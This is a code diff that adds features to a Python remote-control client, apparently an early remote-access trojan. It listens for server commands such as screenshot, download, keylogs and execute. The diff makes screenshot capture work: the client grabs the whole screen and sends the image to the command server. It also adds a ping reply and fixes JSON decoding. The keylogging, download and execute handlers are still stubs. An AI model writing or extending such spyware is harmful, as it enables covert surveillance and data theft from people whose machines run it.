@@ -1,9 +1,22 @@
 import socket
 import threading
 import json
+import io
+from PIL import ImageGrab
 
 SERVER_ADDRESS = "127.0.0.1"
 SERVER_PORT = 1337
+
+def screenshot():
+    """Called upon a screenshot instruction, captures an image of screen and sends to server"""
+    # instantiate an empty bytes object
+    img = io.BytesIO()
+    # capture an image of the screen and store the data in the bytes object
+    ImageGrab.grab().save(img, format="PNG")
+    # send the size of the image in bytes to the server
+    send(sock, str(img.tell()).encode("utf-8"))
+    # send the image to the server
+    return img.getvalue()
 
 
 def handle(data: dict) -> None:
@@ -14,7 +27,7 @@ def handle(data: dict) -> None:
     """
     cmd, args = data.get("cmd"), data.get("args")
     if cmd == "screenshot":
-        pass  # self._screenshot()
+        send(sock, screenshot())
     elif cmd == "download":
         pass  # self._download(data.get("args")[0])
     elif cmd == "keylogs":
@@ -22,8 +35,18 @@ def handle(data: dict) -> None:
     elif cmd == "execute":
         pass  # self._execute(data.get("args"))
     elif cmd == "ping":
-        pass  # send response
+        send(sock, json.dumps({"response": "pong"}).encode("utf-8"))
 
+
+def send(sock: socket.socket, data: bytes) -> None:
+    """Sends data to the server
+
+    Args:
+        sock (socket.socket): The socket to send data to
+        data (dict): The data to send
+    """
+    sock.sendall(data)
+    print(data)
 
 def connect(sock: socket.socket, host: str, port: int) -> None:
     """Connects to a server
@@ -41,7 +64,7 @@ def connect(sock: socket.socket, host: str, port: int) -> None:
         if not (data := sock.recv(1024)):
             break
         try:
-            decoded = json.dumps(data.decode("utf-8"))
+            decoded = json.loads(data.decode("utf-8"))
         except JSONDecodeError:
             continue
         else:
